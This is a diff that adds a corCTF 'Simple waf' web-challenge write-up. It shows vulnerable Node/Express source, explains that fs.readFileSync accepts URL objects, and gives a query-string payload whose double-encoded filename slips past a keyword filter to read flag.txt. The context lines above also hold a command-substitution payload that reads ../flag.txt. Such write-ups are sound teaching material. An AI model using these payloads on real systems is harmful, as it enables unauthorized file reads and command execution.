@@ -75,3 +75,64 @@ it seems to be the beckend takes the type and x , y as key  arguments to be supp
 it works !! , i found the flag in `../flag.txt` with the payload `x:"$(cat ../flag.txt | base64)"` : 
 
 flag : corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}
+
+## Simple waf
+#### about :
+- Type: web 
+- Level: meduim
+- Points : 209
+
+<center><img src="../images/simplewaf.png"></center>
+
+in the [source](../src/dist) code we have this code : 
+
+```javascript
+app.use((req, res, next) => {
+    console.log(JSON.stringify(req.query));
+    if([req.body, req.headers, req.query].some(
+        (item) => item && JSON.stringify(item).includes("flag")
+    )) {
+        return res.send("bad hacker!");
+    }
+    next();
+});
+
+app.get("/", (req, res) => {
+    try {
+        res.setHeader("Content-Type", "text/html");
+        res.send(fs.readFileSync(req.query.file || "index.html").toString());       
+    }
+    catch(err) {
+        console.log(err);
+        res.status(500).send("Internal server error");
+    }
+});
+```
+
+in the  node js documentation the function `fs.readFileSync` path argument can be : 
+> path string | Buffer | URL | integer filename or file descriptor
+we are going to exploit the fact that path can be a URL object , and since its a json format , we only need to set attribute , the URL class have special atribute :
+
+```js
+x= new URL('file://flag.txt')
+console.log(x);
+-> 
+URL {
+  href: 'file://flag.txt/',
+  origin: 'null',
+  protocol: 'file:',
+  username: '',
+  password: '',
+  host: 'flag.txt',
+  hostname: 'flag.txt',
+  port: '',
+  pathname: '/',
+  search: '',
+  searchParams: URLSearchParams {},
+  hash: ''
+}
+```
+the payload wil then be 
+> `file[href]=file://fl%2561g.txt/&file[origin]=x&file[protocol]=file:&file[hostname]=&file[pathname]=fl%2561g.txt&file[host]=fl%2561g.txt`
+
+flag : corctf{hmm_th4t_waf_w4snt_s0_s1mple}
